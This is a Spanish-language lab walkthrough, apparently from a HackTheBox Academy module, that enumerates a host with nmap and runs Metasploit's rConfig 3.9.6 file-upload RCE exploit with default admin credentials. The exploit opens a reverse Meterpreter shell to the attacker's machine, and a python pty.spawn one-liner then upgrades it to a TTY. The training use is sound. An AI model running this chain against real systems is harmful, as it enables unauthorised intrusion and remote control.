Obtener una sesión de shell con un sistema se puede hacer de varias maneras, una forma común es a través de una vulnerabilidad en una aplicación. Identificaremos una vulnerabilidad y descubriremos un exploit que podemos utilizar para obtener un shell entregando una carga útil. Al considerar cómo estableceremos una sesión de shell en un sistema Unix/Linux, nos beneficiaremos al considerar lo siguiente:

- ¿Qué distribución de Linux está ejecutando el sistema?
- ¿Qué lenguajes de programación y shell existen en el sistema?
- ¿Qué función cumple el sistema para el entorno de red en el que se encuentra?
- ¿Qué aplicación aloja el sistema? 
- ¿Existen vulnerabilidades conocidas?

## Obtener un Shell atacando una aplicación vulnerable
#### Enumerar de host
```js
┌──(pelado㉿kali)-[~/HTB/Academy/ShellsPayloads]
└─$ nmap 10.129.201.101 -sCV -p- --min-rate=1000 -Pn -n
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 02:37 EDT
Warning: 10.129.201.101 giving up on port because retransmission cap hit (10).
Stats: 0:02:37 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 58.03% done; ETC: 02:42 (0:01:54 remaining)
Nmap scan report for 10.129.201.101
Host is up (0.15s latency).
Not shown: 53529 closed tcp ports (conn-refused), 12000 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: Host: the

```


¿Qué información podemos obtener de los resultados?
Teniendo en cuenta que podemos ver que el sistema está escuchando en los puertos 80 ( `HTTP`), 443 ( `HTTPS`), 3306 ( `MySQL`), y 21 ( `FTP`), puede ser seguro asumir que se trata de un servidor web que aloja una aplicación web. También podemos ver algunos números de versión revelados asociados con la pila web ( `Apache 2.4.6` y `PHP 7.2.34` ) y la distribución de Linux que se ejecuta en el sistema ( `CentOS`). Antes de decidir una dirección para investigar más a fondo (sumergirse en una madriguera de conejo), también deberíamos intentar navegar hasta la dirección IP a través de un navegador web para descubrir la aplicación alojada, si es posible.
![](https://academy.hackthebox.com/storage/modules/115/rconfig.png)\
Aquí descubrimos una herramienta de gestión de configuración de red llamada [rConfig](https://www.rconfig.com) . Los administradores de sistemas y redes utilizan esta aplicación para automatizar el proceso de configuración de dispositivos de red. Un caso de uso práctico sería utilizar rConfig para configurar de forma remota interfaces de red con información de direcciones IP en múltiples enrutadores simultáneamente. Esta herramienta ahorra tiempo a los administradores pero, si se ve comprometida, podría usarse para acceder a dispositivos de red críticos que conmutan y enrutan paquetes a través de la red. Un atacante malintencionado podría poseer toda la red a través de rConfig, ya que probablemente tendrá acceso de administrador a todos los dispositivos de red utilizados para configurar. Como pentesters, encontrar una vulnerabilidad en esta aplicación se consideraría un descubrimiento muy crítico.

## Descubriendo una vulnerabilidad en rConfig
Mire de cerca la parte inferior de la página de inicio de sesión web y podremos ver el número de versión de rConfig ( `3.9.6`). Deberíamos utilizar esta información para empezar a buscar cualquier `CVEs`, `publicly available exploits`, y `proof of concepts` ( `PoCs`). Mientras investigamos, asegúrese de observar de cerca lo que encontramos y comprender lo que está haciendo. Por supuesto, queremos que nos lleve a una sesión shell con el objetivo.


#### Buscar un módulo de explotación

```js
msf6 > search rconfig
Matching Modules
================
   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   exploit/multi/http/solr_velocity_rce                     2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1     \_ target: Java (in-memory)                            .                .          .      .
   2     \_ target: Unix (in-memory)                            .                .          .      .
   3     \_ target: Linux (dropper)                             .                .          .      .
   4     \_ target: x86/x64 Windows PowerShell                  .                .          .      .
   5     \_ target: x86/x64 Windows CmdStager                   .                .          .      .
   6     \_ target: Windows Exec                                .                .          .      .
   7   auxiliary/gather/nuuo_cms_file_download                  2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   8   exploit/linux/http/rconfig_ajaxarchivefiles_rce          2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   9   exploit/linux/http/rconfig_vendors_auth_file_upload_rce  2021-03-17       excellent  Yes    rConfig Vendors Auth File Upload RCE
   10  exploit/unix/webapp/rconfig_install_cmd_exec             2019-10-28       excellent  Yes    rConfig install Command Execution
   11    \_ target: Automatic (Unix In-Memory)                  .                .          .      .
   12    \_ target: Automatic (Linux Dropper)                   .                .          .      .
```

`rconfig_vendors_auth_file_upload_rce.rb`. Este exploit puede conseguirnos una sesión de shell en una máquina Linux de destino que ejecute rConfig 3.9.6.

## Usando el exploit rConfig y obteniendo un Shell
```js
msf6 > use 9
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > show options

Module options (exploit/linux/http/rconfig_vendors_auth_file_upload_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password of the admin account
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path of the rConfig server
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            yes       Username of the admin account
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.4      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   rConfig <= 3.9.6

View the full module info with the info, or info -d command.

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set RHOSTS 10.129.201.101
RHOSTS => 10.129.201.101
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set LHOST 10.10.15.13
LHOST => 10.10.15.13
```

```js
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.15.13:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'gckvkx.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39927 bytes) to 10.129.201.101
[+] Deleted gckvkx.php
[*] Meterpreter session 1 opened (10.10.15.13:4444 -> 10.129.201.101:34460) at 2024-06-22 03:00:50 -0400

meterpreter > getuid
Server username: apache
meterpreter > 
```

Podemos ver en los pasos descritos en el proceso de explotación que este exploit:
- Comprueba la versión vulnerable de rConfig
- Se autentica con el inicio de sesión web de rConfig
- Carga una carga útil basada en PHP para una conexión de shell inversa
- Elimina la carga útil
- Nos deja con una sesión de shell de Meterpreter

## Generando un Shell TTY con Python

Cuando ingresamos al shell del sistema, notamos que no hay ningún mensaje presente, pero aún podemos emitir algunos comandos del sistema. Este es un caparazón típicamente conocido como `non-tty shell`. Estos shells tienen una funcionalidad limitada y a menudo pueden impedir el uso de comandos esenciales como `su` ( `switch user`) y `sudo` ( `super user do`), que probablemente necesitaremos si buscamos aumentar los privilegios. Esto sucedió porque el usuario de Apache ejecutó la carga útil en el objetivo. Nuestra sesión se establece como usuario de apache. Normalmente, los administradores no acceden al sistema como usuarios de Apache, por lo que no es necesario definir un lenguaje de intérprete de shell en las variables de entorno asociadas con Apache.

Podemos generar manualmente un shell TTY usando Python si está presente en el sistema. Siempre podemos verificar la presencia de Python en sistemas Linux escribiendo el comando: `which python`. Para generar la sesión de shell TTY usando Python, escribimos el siguiente comando:

```js
python3 -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

Este comando usa python para importar el [módulo pty](https://docs.python.org/3/library/pty.html) , luego usa el `pty.spawn` función para ejecutar el `bourne shell binary` ( `/bin/sh`). Ahora tenemos un mensaje ( `sh-4.2$`) y acceso a más comandos del sistema para movernos por el sistema como queramos.